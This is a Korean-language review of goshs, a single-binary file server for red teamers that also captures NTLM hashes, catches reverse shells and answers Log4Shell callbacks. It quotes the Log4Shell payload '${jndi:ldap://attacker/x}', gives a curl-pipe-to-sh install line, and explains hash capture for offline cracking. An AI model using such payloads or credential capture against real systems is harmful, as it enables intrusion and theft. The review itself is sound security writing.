# goshs: 레드팀과 개발자를 위한 단일 바이너리 파일 서버

<https://github.com/patrickhener/goshs>

## 소개

`python3 -m http.server`의 강력한 대체재를 표방하는 Go 기반 단일 바이너리
파일 서버다. 모의침투 테스터(red teamer)와 개발자가 파일 전송, 해시 캡처,
빠른 HTTPS 서버 구동이 필요할 때 Apache나 Nginx를 설정하지 않고 즉시 쓸 수
있도록 설계됐다. v2.0.7 기준으로 HTTP/S, WebDAV, SFTP, SMB, LDAP/S 프로토콜과
NTLM 해시 캡처, DNS/SMTP 콜백, 리버스 셸 캐처까지 단일 바이너리에 통합했다.

파일 조작(다운로드, 업로드, 삭제, 일괄 ZIP, QR 코드), 인증(기본 인증, 인증서
인증, TLS, IP 화이트리스트, 파일 기반 ACL), 공유 링크(토큰, 다운로드 횟수 제한,
시간 제한), 서버 모드(읽기 전용, 업로드 전용, 삭제 불가, 사일런트, 인비저블,
CLI 명령 실행)를 지원한다. CTF/레드팀 특화 기능으로는 NTLM 해시 캡처+크래킹,
JNDI 모드를 통한 Log4Shell 시뮬레이션, 리버스 셸 캐처와 페이로드 생성기가 있다.

Kali Linux, Parrot OS 공식 패키지로 포함돼 있으며 Homebrew, Scoop, winget,
Docker, Nix/NixOS, Alpine, AUR 등 주요 패키지 관리자를 모두 지원한다.

## 분석

### 단일 바이너리의 운영 철학

`goshs`의 핵심 설계 결정은 모든 것을 단일 바이너리에 담는 것이다. 모의침투
테스트 환경에서 도구 설치와 의존성 관리는 실질적인 장벽이다. 타깃 환경에는
Python이 없을 수 있고, 패키지 관리자를 통한 설치가 불가능할 수 있다. 단일
바이너리는 이 문제를 제거한다. `curl -sSfL https://goshs.de/install.sh | sh`
한 줄이나, 미리 크로스컴파일된 바이너리를 복사하는 것으로 모든 플랫폼에서 즉시
실행할 수 있다.

Go 언어의 선택도 이 철학과 일치한다. Go는 CGo 없이 정적 바이너리를 생성하고,
크로스컴파일이 쉬우며, 단일 실행 파일에 웹 서버와 네트워크 프로토콜 스택을
모두 담을 수 있다. Python의 `http.server`가 운영 체제의 Python 런타임에 의존하는
것과 달리, `goshs`는 의존성이 없다.

### 프로토콜 다양성과 레드팀 시나리오

HTTP/S만이 아니라 SMB, SFTP, WebDAV, LDAP/S를 모두 지원하는 이유는 파일
전송 경로가 네트워크 환경에 따라 제한되는 실제 시나리오에 대응하기 위해서다.
방화벽이 HTTP를 막아도 SMB가 열려 있을 수 있고, 그 반대도 마찬가지다.
레드팀 운영에서 어떤 경로가 가능한지 미리 알 수 없으므로, 스위치 하나로
프로토콜을 전환할 수 있는 것이 가치 있다.

NTLM 해시 캡처는 SMB 서버가 자격증명 인증 요청을 받을 때 발생하는 NTLMv2
해시를 수집한다. Windows 환경에서 SMB 서버에 접속하면 클라이언트가 자동으로
NTLM 인증을 시도하는데, 이것을 낚아채 오프라인 크래킹에 사용하는 것이다.
Responder와 같은 도구가 하는 것을 `goshs` 단독으로 수행할 수 있다.

### Log4Shell 콜백 시뮬레이션

LDAP 모드의 JNDI(Java Naming and Directory Interface) 지원은 Log4Shell(CVE-2021-44228)
취약점 테스트에 활용된다. 취약한 Java 애플리케이션이 로그에 `${jndi:ldap://attacker/x}`
패턴을 포함한 문자열을 처리할 때 외부 LDAP 서버에 콜백을 보내는 것을 검증하는
데 `goshs`의 LDAP 서버를 수신 엔드포인트로 쓸 수 있다. 별도 LDAP 서버 설정
없이 이 시나리오를 재현할 수 있다.

## 비평

### 긍정적 측면

`goshs`의 가장 큰 강점은 레드팀 시나리오에서 반복적으로 필요한 기능들을
한 도구에 묶었다는 점이다. 기존에는 파일 서버, NTLM 캡처(Responder), 리버스
셸 캐처, DNS 콜백 서버를 각각 따로 실행해야 했다. 이것을 하나의 프로세스,
하나의 바이너리로 대체하면 운영 복잡성이 크게 줄어든다.

문서화도 충실하다. Quick Start 예제가 실제 사용 시나리오를 중심으로 구성돼
있고, 별도 문서 사이트(docs.goshs.de)와 라이브 데모(demo.goshs.de)까지 제공한다.
보안 기여자 목록을 별도로 관리하는 것은 도구 자체의 보안에도 신경 쓴다는
신호다.

### 한계

기능이 많아진 만큼 공격 표면도 넓어졌다. HTTP 파일 서버와 NTLM 캡처와
DNS/SMTP 콜백이 같은 프로세스에서 실행된다는 것은, 하나의 취약점이 전체를
노출시킬 수 있다는 의미이기도 하다. 모의침투 환경이 아닌 지속적 내부 도구로
사용할 경우 이 리스크를 고려해야 한다.

또한 이 도구는 명백히 공격자 관점에서 설계됐다. Kali Linux 패키지 포함, “red
teamers”를 1차 대상으로 명시한 것이 그것을 보여준다. 방어 목적으로 사용하는 것도
가능하지만, NTLM 해시 캡처나 리버스 셸 캐처 같은 기능은 인가된 환경에서만
사용해야 한다.

## 인사이트

### 도구 통합의 역설: 단순화가 복잡성을 낳는다

`goshs`는 복잡한 설정을 제거하는 방향으로 설계됐지만, 아이러니하게도 그 과정에서
새로운 복잡성을 만든다. 사용자는 `goshs -smb -ldap -dns -smtp` 한 명령으로
네 가지 서버를 동시에 실행할 수 있다. 이것은 분명히 편리하지만, 어떤 포트가
열렸는지, 어떤 프로토콜이 어떤 데이터를 캡처하는지 추적하기가 쉽지 않다.

이 패턴은 보안 도구 설계의 근본적 긴장이다. 사용 편의성을 높이면 각 작업에
무슨 일이 일어나는지 이해하기 어려워진다. 초보자는 명령 한 줄로 많은 것을
할 수 있지만, 실제로 무슨 일이 일어나는지 파악하지 못한 채 도구를 사용할 위험이
있다. 반면 각 기능을 분리된 도구로 운영하면 이해도는 높아지지만 운영 부담이
커진다. `goshs`는 숙련된 레드팀을 1차 대상으로 삼았기 때문에 이 트레이드오프를
편의성 쪽으로 해결했다.

### `python3 -m http.server`의 생태학적 위치

`python3 -m http.server`는 완벽하지 않지만 어디에나 있다. Python이 설치된
시스템이라면 추가 설치 없이 즉시 쓸 수 있다. `goshs`의 도전은 이 유비쿼터스성을
이길 수 없다는 것이다. 기본 설치 도구를 대체하려면 그것보다 현저히 더 좋아야
한다. `goshs`는 레드팀 사용 사례에서는 분명히 더 좋다. 하지만 “빠르게 파일
하나 공유”라는 가장 흔한 사용 사례에서는 `python3 -m http.server`가 여전히
충분하다.

이것이 `goshs`가 일반 개발자보다 레드팀에 집중하는 전략적 이유이기도 하다.
레드팀 사용 사례는 `python3 -m http.server`로 충족할 수 없는 고유한 필요가
있다. NTLM 캡처, JNDI 콜백, 리버스 셸 캐처는 Python 표준 라이브러리가 제공하지
않는다. 이 틈새를 정확히 공략한 것이 `goshs`가 Kali 공식 패키지가 된 이유다.

### 단일 바이너리 도구의 배포 생태계 성숙

`goshs`의 배포 방식 목록이 인상적이다. apt, AUR, Alpine apk, NixOS, Homebrew,
Scoop, winget, Docker, Go install까지 사실상 모든 주요 패키지 생태계를 지원한다.
이것은 Go 단일 바이너리 도구의 배포가 얼마나 성숙해졌는지를 보여주는 지표다.

5년 전만 해도 오픈소스 CLI 도구가 이 많은 패키지 관리자를 지원하려면 상당한
유지보수 부담이 따랐다. 지금은 goreleaser 같은 도구가 크로스컴파일과 여러
플랫폼 패키지 생성을 자동화해준다. GitHub Actions 배지에 goreleaser가 포함된
것이 이것을 보여준다. 도구 작성자가 아이디어에 집중하고, 배포 인프라는 생태계가
담당하는 분업이 성숙한 것이다.

이 배포 생태계 성숙은 장기적으로 단일 목적 도구가 더 쉽게 탄생하는 환경을
만든다. 과거에는 배포 복잡성 때문에 “이 정도 기능이면 굳이 별도 도구로 만들
필요 있나”라는 판단이 나왔다면, 이제는 특정 사용 사례를 잘 해결하는 작은
도구를 만들고 배포하는 비용이 크게 낮아졌다. `goshs`가 그 예시다.
